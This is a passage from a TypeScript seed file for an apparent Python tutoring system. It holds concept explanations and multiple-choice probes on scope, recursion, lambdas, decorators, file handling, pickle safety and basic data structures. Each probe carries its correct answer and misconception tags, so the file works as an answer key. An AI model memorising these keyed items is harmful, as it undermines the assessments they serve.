    stem: 'Why does `x = 5; def f(): print(x); x = 10` raise UnboundLocalError when f() is called?',
    choices: [
      { text: 'Python sees `x = 10` in f and marks x as local for the entire function; `print(x)` then tries to read local x before it is assigned — UnboundLocalError', isCorrect: true },
      { text: 'print(x) runs before x = 10 because Python executes all print statements first; the order does not matter for UnboundLocalError', isCorrect: false, misconceptionId: `${SCOPE}:M2` },
    ],
    correctValue: 'Assignment anywhere in the function makes x local for the whole function — reading before assignment fails',
    difficulty: ProbeDifficulty.PROFICIENT,
    targetedMisconceptions: [`${SCOPE}:M2`],
    source: SCOPE_SRC,
  },
]

// ─── cs.func.recursion ────────────────────────────────────────────────────────
const RECUR = 'cs.func.recursion'
const RECUR_SRC = 'docs/computer-science/kg/graph.json — cs.func.recursion'
const RECUR_EXPLANATIONS: SeedExplanation[] = [
  {
    conceptId: RECUR, subjectSlug: 'computer_science', familyKind: 'core_explanation',
    gradeBand: GradeBand.UNDERGRADUATE,
    content:
      'A recursive function calls itself with a simpler version of the problem, building toward a base case where the answer is known directly without further recursion. ' +
      'Every recursive function needs: (1) a base case (returns a value directly — terminates the recursion), ' +
      '(2) a recursive case (calls itself on a smaller input). ' +
      'factorial(n) = 1 if n==0 else n * factorial(n-1): base case n==0, recursive case n * factorial(n-1). ' +
      'The call stack stores each call\'s local variables and return address; deep recursion fills the stack → RecursionError (stack overflow). ' +
      'Python\'s default recursion limit is 1000. ' +
      'Tail recursion (the recursive call is the last operation) can theoretically be optimised to constant stack space, but Python does not perform tail-call optimisation.',
    targetedMisconceptions: [],
    source: RECUR_SRC,
  },
  {
    conceptId: RECUR, subjectSlug: 'computer_science', familyKind: 'misconception_repair',
    gradeBand: GradeBand.UNDERGRADUATE,
    content:
      'Recursion is not inherently inefficient — naïve recursion on overlapping subproblems is (re-computing the same call many times). ' +
      'Recursive merge sort is O(n log n); recursive binary search is O(log n). ' +
      'Naïve recursive Fibonacci is O(2ⁿ) because of redundant recomputation — memoisation fixes it to O(n). ' +
      'Missing or wrong base cases cause infinite recursion → RecursionError. ' +
      'The recursive case MUST reduce the input toward the base case; ' +
      '`def bad(n): return bad(n)` recurses forever because n never changes.',
    targetedMisconceptions: [`${RECUR}:M1`],
    source: RECUR_SRC,
  },
]
const RECUR_PROBES: SeedProbe[] = [
  {
    conceptId: RECUR, subjectSlug: 'computer_science', probeKind: 'mcq',
    gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'def count(n): if n == 0: return; print(n); count(n-1). What is the output of count(3)?',
    choices: [
      { text: '3, 2, 1 — prints n=3, recurses with n=2, prints 2, recurses with n=1, prints 1, recurses with n=0 which returns', isCorrect: true },
      { text: '1, 2, 3 — recursive calls complete before printing; the output is bottom-up', isCorrect: false, misconceptionId: `${RECUR}:M2` },
      { text: 'RecursionError — the base case is wrong; n==0 should recurse to n=-1 to terminate', isCorrect: false },
    ],
    correctValue: '3, 2, 1 — print happens before recursive call',
    difficulty: ProbeDifficulty.PROFICIENT,
    targetedMisconceptions: [`${RECUR}:M2`],
    source: RECUR_SRC,
  },
  {
    conceptId: RECUR, subjectSlug: 'computer_science', probeKind: 'misconception_probe',
    gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'def f(n): return f(n). What error does this cause, and why?',
    choices: [
      { text: 'RecursionError — the recursive case never reduces n toward a base case; the call stack fills and Python terminates the call', isCorrect: true },
      { text: 'SyntaxError — a function cannot call itself without using a different variable name', isCorrect: false, misconceptionId: `${RECUR}:M3` },
    ],
    correctValue: 'RecursionError — infinite recursion with no base case or progress toward one',
    difficulty: ProbeDifficulty.PROFICIENT,
    targetedMisconceptions: [`${RECUR}:M3`],
    source: RECUR_SRC,
  },
]

// ─── cs.func.lambda-functional ────────────────────────────────────────────────
const LAMBDA = 'cs.func.lambda-functional'
const LAMBDA_SRC = 'docs/computer-science/kg/graph.json — cs.func.lambda-functional'
const LAMBDA_EXPLANATIONS: SeedExplanation[] = [
  {
    conceptId: LAMBDA, subjectSlug: 'computer_science', familyKind: 'core_explanation',
    gradeBand: GradeBand.UNDERGRADUATE,
    content:
      'Lambda functions are anonymous, single-expression functions: `lambda x, y: x + y`. ' +
      'They are equivalent to a def with a single return statement, useful inline where a function object is expected. ' +
      '`sorted(students, key=lambda s: s["grade"])` — sorts using the grade field without defining a named function. ' +
      'Functional programming uses functions as first-class values: ' +
      '`map(func, iterable)` applies func to every element; ' +
      '`filter(func, iterable)` keeps elements where func returns True; ' +
      '`functools.reduce(func, iterable)` combines elements left to right. ' +
      'These are mostly replaced by list comprehensions in modern Python, but remain important for understanding higher-order functions and for use with pandas/numpy APIs that expect callable arguments.',
    targetedMisconceptions: [],
    source: LAMBDA_SRC,
  },
  {
    conceptId: LAMBDA, subjectSlug: 'computer_science', familyKind: 'misconception_repair',
    gradeBand: GradeBand.UNDERGRADUATE,
    content:
      'Lambda functions cannot contain statements (if/for/while/return) — only a single expression. ' +
      'For anything more than a simple one-liner, use a named def — it is more readable and debuggable. ' +
      'A common anti-pattern: `f = lambda x: x**2; f(5)` — there is no benefit over `def f(x): return x**2`. ' +
      'Lambdas are for when you need a throwaway function inline and naming it would be more verbose. ' +
      'Also: `map()` and `filter()` return iterators in Python 3, not lists — wrap with `list()` to get a list.',
    targetedMisconceptions: [`${LAMBDA}:M1`],
    source: LAMBDA_SRC,
  },
]
const LAMBDA_PROBES: SeedProbe[] = [
  {
    conceptId: LAMBDA, subjectSlug: 'computer_science', probeKind: 'mcq',
    gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'What does `list(map(lambda x: x**2, [1,2,3]))` produce?',
    choices: [
      { text: '[1, 4, 9] — map applies the lambda to each element; list() materialises the iterator', isCorrect: true },
      { text: '(1, 4, 9) — map returns a tuple in Python 3', isCorrect: false, misconceptionId: `${LAMBDA}:M2` },
      { text: '[1, 2, 3] — lambda x: x**2 returns x, not x squared (the ** operator has low precedence)', isCorrect: false },
    ],
    correctValue: '[1, 4, 9] — map applies lambda; list() converts the iterator',
    difficulty: ProbeDifficulty.PROFICIENT,
    targetedMisconceptions: [`${LAMBDA}:M2`],
    source: LAMBDA_SRC,
  },
  {
    conceptId: LAMBDA, subjectSlug: 'computer_science', probeKind: 'misconception_probe',
    gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'A student writes `lambda x: if x > 0: return x else: return -x`. What is wrong?',
    choices: [
      { text: 'Lambda bodies cannot contain statements like if/return; only expressions are allowed: `lambda x: x if x > 0 else -x`', isCorrect: true },
      { text: 'The syntax is correct but lambda functions require parentheses around the body', isCorrect: false, misconceptionId: `${LAMBDA}:M1` },
    ],
    correctValue: 'Lambda allows only a single expression, not statements like if/return',
    difficulty: ProbeDifficulty.PROFICIENT,
    targetedMisconceptions: [`${LAMBDA}:M1`],
    source: LAMBDA_SRC,
  },
]

// ─── cs.func.modules-packages ─────────────────────────────────────────────────
const MODPKG = 'cs.func.modules-packages'
const MODPKG_SRC = 'docs/computer-science/kg/graph.json — cs.func.modules-packages'
const MODPKG_EXPLANATIONS: SeedExplanation[] = [
  {
    conceptId: MODPKG, subjectSlug: 'computer_science', familyKind: 'core_explanation',
    gradeBand: GradeBand.UNDERGRADUATE,
    content:
      'A module is a .py file containing Python definitions and statements — functions, classes, and variables. ' +
      '`import math` makes the math module available; `math.sqrt(16)` calls its sqrt function. ' +
      '`from math import sqrt` imports sqrt directly into the current namespace. ' +
      '`import math as m` creates an alias. ' +
      'A package is a directory containing modules and a `__init__.py` file. ' +
      'The Python standard library includes batteries-included modules: math, random, os, sys, json, re, datetime, pathlib, collections, itertools, functools. ' +
      'Third-party packages are installed via pip: `pip install requests`. ' +
      'Virtual environments (`python -m venv env`) isolate package versions per project. ' +
      '`if __name__ == "__main__":` guard: code under this runs only when the file is executed directly, not when imported as a module.',
    targetedMisconceptions: [],
    source: MODPKG_SRC,
  },
  {
    conceptId: MODPKG, subjectSlug: 'computer_science', familyKind: 'misconception_repair',
    gradeBand: GradeBand.UNDERGRADUATE,
    content:
      '`from module import *` (star import) is tempting but dangerous — it imports all public names into the current namespace, risking silent name collisions. ' +
      'If two modules both define a function `process()`, `from mod1 import *; from mod2 import *` will silently keep only mod2\'s version. ' +
      'Best practice: import the module and use qualified names (`mod1.process()`) or import only specific names (`from mod1 import process as process_mod1`). ' +
      'Also: naming your own file the same as a standard library module (e.g., `math.py`) shadows the stdlib module and causes confusing ImportErrors.',
    targetedMisconceptions: [`${MODPKG}:M1`],
    source: MODPKG_SRC,
  },
]
const MODPKG_PROBES: SeedProbe[] = [
  {
    conceptId: MODPKG, subjectSlug: 'computer_science', probeKind: 'mcq',
    gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'What does the `if __name__ == "__main__":` guard do in a Python module?',
    choices: [
      { text: 'Code under it runs only when the file is executed directly (not when imported); it prevents test/startup code from running when the module is used as a library', isCorrect: true },
      { text: 'It defines the entry point for a class named Main; it is required for any Python script that uses classes', isCorrect: false, misconceptionId: `${MODPKG}:M2` },
      { text: 'It checks that the __name__ variable has been correctly set before running any code', isCorrect: false },
    ],
    correctValue: '__name__ == "__main__" is True only when run directly, not when imported',
    difficulty: ProbeDifficulty.PROFICIENT,
    targetedMisconceptions: [`${MODPKG}:M2`],
    source: MODPKG_SRC,
  },
  {
    conceptId: MODPKG, subjectSlug: 'computer_science', probeKind: 'misconception_probe',
    gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'A student names their file `random.py` and then tries `import random` at the top. They get unexpected errors. Why?',
    choices: [
      { text: 'Python finds the local `random.py` first, shadowing the standard library `random` module; the file imports itself instead of the stdlib module', isCorrect: true },
      { text: 'Python prohibits naming files the same as stdlib modules and raises an ImportError at the time of file creation', isCorrect: false, misconceptionId: `${MODPKG}:M1` },
    ],
    correctValue: 'Local file shadows stdlib — never name your file the same as an stdlib module',
    difficulty: ProbeDifficulty.PROFICIENT,
    targetedMisconceptions: [`${MODPKG}:M1`],
    source: MODPKG_SRC,
  },
]

// ─── cs.func.decorators ───────────────────────────────────────────────────────
const DECOR = 'cs.func.decorators'
const DECOR_SRC = 'docs/computer-science/kg/graph.json — cs.func.decorators'
const DECOR_EXPLANATIONS: SeedExplanation[] = [
  {
    conceptId: DECOR, subjectSlug: 'computer_science', familyKind: 'core_explanation',
    gradeBand: GradeBand.UNDERGRADUATE,
    content:
      'A decorator is a function that takes another function as input and returns a modified (wrapped) function. ' +
      '`@decorator` syntax is sugar for `func = decorator(func)`. ' +
      'Example: a timing decorator wraps a function to measure and log its execution time without modifying its source. ' +
      '`functools.wraps(func)` should be applied to the wrapper to preserve the original function\'s name and docstring. ' +
      'Common use cases: logging, timing, caching (`functools.lru_cache`), access control, retry logic, input validation. ' +
      'Decorators with arguments use three layers: the outermost function takes arguments and returns the actual decorator. ' +
      'Class decorators and decorating methods follow the same pattern; `@staticmethod` and `@classmethod` are built-in decorators.',
    targetedMisconceptions: [],
    source: DECOR_SRC,
  },
  {
    conceptId: DECOR, subjectSlug: 'computer_science', familyKind: 'misconception_repair',
    gradeBand: GradeBand.UNDERGRADUATE,
    content:
      'A decorator REPLACES the original function with a new one — this matters for debugging. ' +
      'Without `@functools.wraps(func)`, the wrapped function\'s `__name__` and `__doc__` become those of the wrapper, breaking tools that rely on introspection (logging, documentation generators, unit test reporters). ' +
      'Always include `@functools.wraps(func)` inside the wrapper to forward the original metadata. ' +
      'Also: `@decorator` at definition time IMMEDIATELY calls `decorator(func)` — the decorator runs once at class/module load, not every time the function is called. ' +
      'The INNER wrapper function is what runs at call time.',
    targetedMisconceptions: [`${DECOR}:M1`],
    source: DECOR_SRC,
  },
]
const DECOR_PROBES: SeedProbe[] = [
  {
    conceptId: DECOR, subjectSlug: 'computer_science', probeKind: 'mcq',
    gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'What does `@my_decorator` above a function definition actually do in Python?',
    choices: [
      { text: 'It is syntactic sugar for `func = my_decorator(func)` — the decorator is called immediately at definition time with the function as its argument', isCorrect: true },
      { text: 'It marks the function to be called through my_decorator at each invocation, without running my_decorator at definition time', isCorrect: false, misconceptionId: `${DECOR}:M1` },
      { text: 'It subclasses the function with my_decorator as the base class', isCorrect: false },
    ],
    correctValue: '@decorator = func = decorator(func) at definition time',
    difficulty: ProbeDifficulty.ADVANCED,
    targetedMisconceptions: [`${DECOR}:M1`],
    source: DECOR_SRC,
  },
  {
    conceptId: DECOR, subjectSlug: 'computer_science', probeKind: 'misconception_probe',
    gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'A decorator is applied to `def process()`. Without `@functools.wraps`, what unintended consequence occurs?',
    choices: [
      { text: 'process.__name__ becomes the wrapper\'s name (e.g., "wrapper"), breaking introspection-based tools like test runners and documentation generators', isCorrect: true },
      { text: 'The function raises a RuntimeError because decorators must always include @functools.wraps to be valid', isCorrect: false, misconceptionId: `${DECOR}:M2` },
    ],
    correctValue: 'Without wraps, __name__/__doc__ are lost — always include @functools.wraps(func) in wrappers',
    difficulty: ProbeDifficulty.ADVANCED,
    targetedMisconceptions: [`${DECOR}:M2`],
    source: DECOR_SRC,
  },
]


// ─── Batch 3: cs.file ────────────────────────────────────────────────────────
const TXTFILE = 'cs.file.text-files'
const TXTFILE_SRC = 'docs/computer-science/kg/graph.json — cs.file.text-files'
const TXTFILE_EXPLANATIONS: SeedExplanation[] = [
  { conceptId: TXTFILE, subjectSlug: 'computer_science', familyKind: 'core_explanation', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'A text file stores human-readable characters encoded as bytes (UTF-8, ASCII). Python\'s open("f.txt","r") returns a file object; read() loads the whole file into a string, readline() reads one line, and the file is an iterable of lines. Always use a with block — it guarantees close() even if an exception occurs. Writing modes: "w" truncates and writes; "a" appends. The newline character \\n is the universal line separator; Python normalises platform newlines on read by default.',
    targetedMisconceptions: [`${TXTFILE}:M1`], source: TXTFILE_SRC },
  { conceptId: TXTFILE, subjectSlug: 'computer_science', familyKind: 'misconception_repair', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'Misconception: "Opening a file in "w" mode to add data keeps the existing content." Mode "w" TRUNCATES the file to zero bytes before writing — existing content is gone. To add without destroying, use "a" (append) mode. This silently destroys data if confused; it is one of the most common destructive bugs beginners write.',
    targetedMisconceptions: [`${TXTFILE}:M1`], source: TXTFILE_SRC },
]
const TXTFILE_PROBES: SeedProbe[] = [
  { conceptId: TXTFILE, subjectSlug: 'computer_science', probeKind: 'mcq', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'You want to add a new log entry to an existing log.txt without losing prior entries. Which open mode is correct?',
    choices: [
      { text: '"a" (append)', isCorrect: true },
      { text: '"w" (write)', isCorrect: false, misconceptionId: `${TXTFILE}:M1` },
      { text: '"r" (read)', isCorrect: false },
      { text: '"x" (exclusive create)', isCorrect: false },
    ], correctValue: '"a"', difficulty: ProbeDifficulty.DEVELOPING, targetedMisconceptions: [`${TXTFILE}:M1`], source: TXTFILE_SRC },
  { conceptId: TXTFILE, subjectSlug: 'computer_science', probeKind: 'misconception_probe', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'What happens to a non-empty file when you call open("data.txt", "w")?',
    choices: [
      { text: 'All existing content is erased immediately', isCorrect: true },
      { text: 'New content is appended after existing content', isCorrect: false, misconceptionId: `${TXTFILE}:M1` },
    ], correctValue: 'Content erased', difficulty: ProbeDifficulty.DEVELOPING, targetedMisconceptions: [`${TXTFILE}:M1`], source: TXTFILE_SRC },
]

const CSVFILE = 'cs.file.csv-files'
const CSVFILE_SRC = 'docs/computer-science/kg/graph.json — cs.file.csv-files'
const CSVFILE_EXPLANATIONS: SeedExplanation[] = [
  { conceptId: CSVFILE, subjectSlug: 'computer_science', familyKind: 'core_explanation', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'CSV (Comma-Separated Values) is plain text where each line is a record and commas delimit fields. Python\'s csv module handles edge cases plain split(",") misses: quoted fields containing commas, embedded newlines, and escaped quotes. csv.reader(f) yields lists; csv.DictReader(f) uses the header row as keys. csv.writer(f) writes rows; csv.DictWriter(f, fieldnames=[...]) writes dicts. Always open with newline="" on Windows to prevent double newlines.',
    targetedMisconceptions: [`${CSVFILE}:M1`], source: CSVFILE_SRC },
  { conceptId: CSVFILE, subjectSlug: 'computer_science', familyKind: 'misconception_repair', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'Misconception: "I can parse CSV by splitting each line on commas." This breaks the moment any field contains a comma inside quotes — e.g., "Smith, John",30 split on comma gives three parts instead of two. The csv module handles RFC 4180 quoting rules correctly. Always use the module, never manual split.',
    targetedMisconceptions: [`${CSVFILE}:M1`], source: CSVFILE_SRC },
]
const CSVFILE_PROBES: SeedProbe[] = [
  { conceptId: CSVFILE, subjectSlug: 'computer_science', probeKind: 'mcq', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'A CSV row is: "Jones, Bob",42,London. How many fields does it contain?',
    choices: [
      { text: '3 — the csv module treats "Jones, Bob" as one quoted field', isCorrect: true },
      { text: '4 — splitting on comma gives Jones / Bob / 42 / London', isCorrect: false, misconceptionId: `${CSVFILE}:M1` },
    ], correctValue: '3', difficulty: ProbeDifficulty.DEVELOPING, targetedMisconceptions: [`${CSVFILE}:M1`], source: CSVFILE_SRC },
  { conceptId: CSVFILE, subjectSlug: 'computer_science', probeKind: 'misconception_probe', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'Why should you use csv.reader instead of line.split(",") to parse CSV?',
    choices: [
      { text: 'split(",") breaks on commas inside quoted fields; csv.reader handles quoting correctly', isCorrect: true },
      { text: 'split(",") is too slow; csv.reader is faster', isCorrect: false },
    ], correctValue: 'Quoted field handling', difficulty: ProbeDifficulty.DEVELOPING, targetedMisconceptions: [`${CSVFILE}:M1`], source: CSVFILE_SRC },
]

const BINSERIAL = 'cs.file.binary-serialisation'
const BINSERIAL_SRC = 'docs/computer-science/kg/graph.json — cs.file.binary-serialisation'
const BINSERIAL_EXPLANATIONS: SeedExplanation[] = [
  { conceptId: BINSERIAL, subjectSlug: 'computer_science', familyKind: 'core_explanation', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'Serialisation converts a Python object into a byte stream for storage or transmission; deserialisation reverses it. pickle serialises arbitrary Python objects (open file in "rb"/"wb" mode; pickle.dump(obj,f) / pickle.load(f)); it is Python-specific and must never be used with untrusted data. json.dumps(obj) / json.loads(s) serialise to/from text; portable across languages but limited to dicts, lists, strings, numbers, bools, None. struct.pack/unpack handles fixed-width binary formats for interoperability with C code or network protocols.',
    targetedMisconceptions: [`${BINSERIAL}:M1`], source: BINSERIAL_SRC },
  { conceptId: BINSERIAL, subjectSlug: 'computer_science', familyKind: 'misconception_repair', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'Misconception: "pickle is a safe way to load files from the internet." Unpickling executes arbitrary Python code embedded in the file. A malicious pickle file can delete your files, exfiltrate data, or install malware. pickle is only safe when you produced the file yourself and control its provenance entirely. For external data use JSON or a schema-validated format.',
    targetedMisconceptions: [`${BINSERIAL}:M1`], source: BINSERIAL_SRC },
]
const BINSERIAL_PROBES: SeedProbe[] = [
  { conceptId: BINSERIAL, subjectSlug: 'computer_science', probeKind: 'mcq', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'You need to save a Python dict to a file and reload it in a Java program. Which format is appropriate?',
    choices: [
      { text: 'JSON — language-neutral text format', isCorrect: true },
      { text: 'pickle — fast Python-native serialisation', isCorrect: false, misconceptionId: `${BINSERIAL}:M1` },
      { text: 'struct.pack — fixed binary layout', isCorrect: false },
      { text: 'Plain repr() string', isCorrect: false },
    ], correctValue: 'JSON', difficulty: ProbeDifficulty.DEVELOPING, targetedMisconceptions: [`${BINSERIAL}:M1`], source: BINSERIAL_SRC },
  { conceptId: BINSERIAL, subjectSlug: 'computer_science', probeKind: 'misconception_probe', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'Why is pickle.load(f) dangerous when f comes from an untrusted source?',
    choices: [
      { text: 'Unpickling executes arbitrary code embedded in the file — it is a code execution vector', isCorrect: true },
      { text: 'pickle files are too large — the risk is a disk-space denial of service', isCorrect: false },
    ], correctValue: 'Code execution risk', difficulty: ProbeDifficulty.PROFICIENT, targetedMisconceptions: [`${BINSERIAL}:M1`], source: BINSERIAL_SRC },
]

// ─── cs.struct ────────────────────────────────────────────────────────────────
const STACKS = 'cs.struct.stacks'
const STACKS_SRC = 'docs/computer-science/kg/graph.json — cs.struct.stacks'
const STACKS_EXPLANATIONS: SeedExplanation[] = [
  { conceptId: STACKS, subjectSlug: 'computer_science', familyKind: 'core_explanation', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'A stack is a Last-In-First-Out (LIFO) collection. The only legal operations are push (add to top) and pop (remove from top), both O(1). Python list works as a stack: append() is push, pop() is pop. Use cases: function call stack (each call frame is pushed; return pops it), undo/redo, expression evaluation, balanced-bracket checking. The discipline of allowing access only at one end gives stacks their predictable, reasoning-friendly behaviour.',
    targetedMisconceptions: [`${STACKS}:M1`], source: STACKS_SRC },
  { conceptId: STACKS, subjectSlug: 'computer_science', familyKind: 'misconception_repair', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'Misconception: "A stack and a list are the same thing." A list allows random access at any index; a stack deliberately restricts access to one end. The restriction is the point — it enforces an ordering invariant (LIFO) that makes certain algorithms correct and simple. Using a list when you need stack semantics is fine in Python, but mentally treating them as equivalent misses why LIFO matters algorithmically.',
    targetedMisconceptions: [`${STACKS}:M1`], source: STACKS_SRC },
]
const STACKS_PROBES: SeedProbe[] = [
  { conceptId: STACKS, subjectSlug: 'computer_science', probeKind: 'mcq', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'After push(1), push(2), push(3), pop() — what does the next pop() return?',
    choices: [
      { text: '2', isCorrect: true },
      { text: '1', isCorrect: false },
      { text: '3', isCorrect: false, misconceptionId: `${STACKS}:M1` },
    ], correctValue: '2', difficulty: ProbeDifficulty.DEVELOPING, targetedMisconceptions: [`${STACKS}:M1`], source: STACKS_SRC },
  { conceptId: STACKS, subjectSlug: 'computer_science', probeKind: 'misconception_probe', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'What is the key algorithmic property that makes a stack useful for bracket-matching?',
    choices: [
      { text: 'LIFO order — the most recently opened bracket is the first one that must be closed', isCorrect: true },
      { text: 'Random access — you can check any bracket position in O(1)', isCorrect: false, misconceptionId: `${STACKS}:M1` },
    ], correctValue: 'LIFO ordering', difficulty: ProbeDifficulty.PROFICIENT, targetedMisconceptions: [`${STACKS}:M1`], source: STACKS_SRC },
]

const QUEUES = 'cs.struct.queues'
const QUEUES_SRC = 'docs/computer-science/kg/graph.json — cs.struct.queues'
const QUEUES_EXPLANATIONS: SeedExplanation[] = [
  { conceptId: QUEUES, subjectSlug: 'computer_science', familyKind: 'core_explanation', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'A queue is a First-In-First-Out (FIFO) collection. Enqueue adds to the rear; dequeue removes from the front — both O(1) with a deque implementation. Use collections.deque in Python: append() enqueues, popleft() dequeues. Do not use a list for queues — list.pop(0) is O(n) because it shifts all elements. Use cases: BFS graph traversal, task scheduling, print spooling, request queuing in servers.',
    targetedMisconceptions: [`${QUEUES}:M1`], source: QUEUES_SRC },
  { conceptId: QUEUES, subjectSlug: 'computer_science', familyKind: 'misconception_repair', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'Misconception: "I can use a Python list as a queue with list.pop(0)." Correct result, wrong complexity. list.pop(0) is O(n) because every remaining element shifts left. For 1,000,000 items processed as a queue this way, you pay O(n²) total — 10¹² operations instead of 10⁶. Always use collections.deque for FIFO queues.',
    targetedMisconceptions: [`${QUEUES}:M1`], source: QUEUES_SRC },
]
const QUEUES_PROBES: SeedProbe[] = [
  { conceptId: QUEUES, subjectSlug: 'computer_science', probeKind: 'mcq', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'Which Python data structure gives O(1) enqueue AND O(1) dequeue?',
    choices: [
      { text: 'collections.deque', isCorrect: true },
      { text: 'list (using append and pop(0))', isCorrect: false, misconceptionId: `${QUEUES}:M1` },
      { text: 'tuple', isCorrect: false },
      { text: 'set', isCorrect: false },
    ], correctValue: 'collections.deque', difficulty: ProbeDifficulty.DEVELOPING, targetedMisconceptions: [`${QUEUES}:M1`], source: QUEUES_SRC },
  { conceptId: QUEUES, subjectSlug: 'computer_science', probeKind: 'misconception_probe', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'Why is list.pop(0) a bad choice for a queue\'s dequeue operation?',
    choices: [
      { text: 'It is O(n) — every element shifts left after removal', isCorrect: true },
      { text: 'It removes from the wrong end — it should remove from the right', isCorrect: false },
    ], correctValue: 'O(n) shift cost', difficulty: ProbeDifficulty.PROFICIENT, targetedMisconceptions: [`${QUEUES}:M1`], source: QUEUES_SRC },
]

const DEQUES = 'cs.struct.deques-priority-queues'
const DEQUES_SRC = 'docs/computer-science/kg/graph.json — cs.struct.deques-priority-queues'
const DEQUES_EXPLANATIONS: SeedExplanation[] = [
  { conceptId: DEQUES, subjectSlug: 'computer_science', familyKind: 'core_explanation', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'A deque (double-ended queue) supports O(1) insertion and removal at both ends. Python\'s collections.deque provides appendleft/popleft and append/pop. A priority queue serves the highest-priority item regardless of insertion order — Python\'s heapq module implements a min-heap priority queue: heapq.heappush(h, item) and heapq.heappop(h) both O(log n). For max-heap behaviour, negate values. Use cases: Dijkstra\'s algorithm, event simulation, task schedulers.',
    targetedMisconceptions: [`${DEQUES}:M1`], source: DEQUES_SRC },
  { conceptId: DEQUES, subjectSlug: 'computer_science', familyKind: 'misconception_repair', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'Misconception: "A priority queue pops items in insertion order like a regular queue." A priority queue ignores insertion order — it always pops the minimum (or maximum) priority item. If you push (3,"c"), (1,"a"), (2,"b") in that order, heapq.heappop returns (1,"a") first. This FIFO assumption causes subtle bugs in Dijkstra implementations where the wrong node is expanded first.',
    targetedMisconceptions: [`${DEQUES}:M1`], source: DEQUES_SRC },
]
const DEQUES_PROBES: SeedProbe[] = [
  { conceptId: DEQUES, subjectSlug: 'computer_science', probeKind: 'mcq', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'heapq.heappush(h, 5); heapq.heappush(h, 2); heapq.heappush(h, 8). What does heapq.heappop(h) return?',
    choices: [
      { text: '2 (minimum element)', isCorrect: true },
      { text: '5 (first inserted)', isCorrect: false, misconceptionId: `${DEQUES}:M1` },
      { text: '8 (maximum element)', isCorrect: false },
    ], correctValue: '2', difficulty: ProbeDifficulty.DEVELOPING, targetedMisconceptions: [`${DEQUES}:M1`], source: DEQUES_SRC },
  { conceptId: DEQUES, subjectSlug: 'computer_science', probeKind: 'misconception_probe', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'You push tasks with priorities 3, 1, 2 into a priority queue. In what order are they served?',
    choices: [
      { text: '1, 2, 3 — lowest priority number first (min-heap)', isCorrect: true },
      { text: '3, 1, 2 — insertion order', isCorrect: false, misconceptionId: `${DEQUES}:M1` },
    ], correctValue: '1, 2, 3', difficulty: ProbeDifficulty.DEVELOPING, targetedMisconceptions: [`${DEQUES}:M1`], source: DEQUES_SRC },
]

const LINKEDLIST = 'cs.struct.linked-lists'
const LINKEDLIST_SRC = 'docs/computer-science/kg/graph.json — cs.struct.linked-lists'
const LINKEDLIST_EXPLANATIONS: SeedExplanation[] = [
  { conceptId: LINKEDLIST, subjectSlug: 'computer_science', familyKind: 'core_explanation', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'A singly linked list is a chain of nodes, each holding a value and a pointer to the next node. Head points to the first node; the last node\'s next is None. O(1) prepend (insert at head); O(n) access by index (no random access); O(n) search; O(1) delete given a pointer to the previous node. Linked lists use more memory than arrays (pointer overhead) but allow O(1) insertion/deletion without shifting. Python\'s list is a dynamic array, NOT a linked list.',
    targetedMisconceptions: [`${LINKEDLIST}:M1`], source: LINKEDLIST_SRC },
  { conceptId: LINKEDLIST, subjectSlug: 'computer_science', familyKind: 'misconception_repair', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'Misconception: "Python\'s list is a linked list." Python\'s list is a dynamic array backed by a contiguous memory block. It has O(1) indexed access (arr[i] is a direct memory offset) and O(n) insertion at an arbitrary position. A linked list has O(n) indexed access (must traverse from head) and O(1) insert given a pointer to the correct position. The trade-offs are opposite; confusing them leads to wrong complexity analysis.',
    targetedMisconceptions: [`${LINKEDLIST}:M1`], source: LINKEDLIST_SRC },
]
const LINKEDLIST_PROBES: SeedProbe[] = [
  { conceptId: LINKEDLIST, subjectSlug: 'computer_science', probeKind: 'mcq', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'Accessing the k-th element of a singly linked list takes:',
    choices: [
      { text: 'O(k) — must traverse from the head', isCorrect: true },
      { text: 'O(1) — pointer arithmetic like an array', isCorrect: false, misconceptionId: `${LINKEDLIST}:M1` },
      { text: 'O(log k) — binary search on the list', isCorrect: false },
    ], correctValue: 'O(k)', difficulty: ProbeDifficulty.DEVELOPING, targetedMisconceptions: [`${LINKEDLIST}:M1`], source: LINKEDLIST_SRC },
  { conceptId: LINKEDLIST, subjectSlug: 'computer_science', probeKind: 'misconception_probe', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'Is Python\'s built-in list a linked list?',
    choices: [
      { text: 'No — it is a dynamic array; index access is O(1), not O(n)', isCorrect: true },
      { text: 'Yes — it is a linked list with O(n) index access', isCorrect: false, misconceptionId: `${LINKEDLIST}:M1` },
    ], correctValue: 'No — dynamic array', difficulty: ProbeDifficulty.DEVELOPING, targetedMisconceptions: [`${LINKEDLIST}:M1`], source: LINKEDLIST_SRC },
]

const DBLLIST = 'cs.struct.doubly-circular-lists'
